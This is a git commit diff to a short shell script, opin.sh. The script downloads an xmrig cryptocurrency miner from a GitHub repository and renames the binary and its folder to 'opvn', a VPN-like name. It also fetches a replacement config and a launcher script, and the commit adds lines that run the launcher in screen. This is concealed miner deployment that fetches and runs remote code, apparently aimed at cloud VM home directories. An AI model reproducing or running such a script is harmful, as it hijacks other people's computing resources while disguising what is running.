5e6b5eef0d44cd61c99de154b921c2f3db6e8ec2
bondbenz1821 <126075464+bondbenz1821@users.noreply.github.com>
2023-11-23 18:52:25 +0700

    Update opin.sh

--- opin.sh
+++ opin.sh
@@ -1,13 +1,16 @@
-cd /home/azureuser
+cd /home/*
 wget https://github.com/bondbenz1821/opme/raw/main/opme.tar.gz
 tar -xzsf opme.tar.gz
 mv xmrig* opvn
-cd opvn
+cd opvn/
 mv xmr* opvn
 
 mv config.json config.json.bk
 wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json
 wget https://raw.githubusercontent.com/bondbenz1821/opme/main/opvn.sh
 chmod +x opvn.sh
+screen
+ls && ll
+./opvn.sh
 
 #nohup sh opvn.sh > result.log 2>&1 &
